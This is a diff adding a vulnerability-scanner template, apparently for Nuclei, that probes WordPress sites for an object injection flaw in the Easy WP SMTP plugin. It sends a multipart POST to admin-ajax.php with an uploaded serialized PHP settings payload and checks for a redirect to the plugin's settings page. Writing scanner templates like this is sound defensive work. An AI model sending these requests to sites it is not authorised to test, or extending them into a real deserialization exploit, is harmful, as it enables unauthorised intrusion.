@@ -1,0 +1,42 @@
+id: wordpress-easy-wp-smtp-object-injection
+info:
+  name: WordPress Easy WP SMTP Plugin Object Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: wordpress,plugin,deserialization
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/wordpress/wp-admin/admin-ajax.php"
+      - "{{BaseURL}}/wp-admin/admin-ajax.php"
+      - "{{BaseURL}}/blog/wp-admin/admin-ajax.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=------------------------32437ffa4c7fd5f3"
+    body: |-
+      --------------------------32437ffa4c7fd5f3
+      Content-Disposition: form-data; name="action"
+
+      swpsmtp_clear_log
+      --------------------------32437ffa4c7fd5f3
+      Content-Disposition: form-data; name="swpsmtp_import_settings"
+
+      1
+      --------------------------32437ffa4c7fd5f3
+      Content-Disposition: form-data; name="swpsmtp_import_settings_file"; filename="upload.txt"
+      Content-Type: text/plain
+
+      a:2:{s:4:"data";s:28:"a:1:{s:4:"test";s:4:"test";}";s:8:"checksum";s:32:"9630c1efb63ffa0db8d2c94163484284";}
+      --------------------------32437ffa4c7fd5f3--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        part: header
+        words:
+          - "Location"
+          - "/wp-admin/options-general.php?page=swpsmtp_settings"
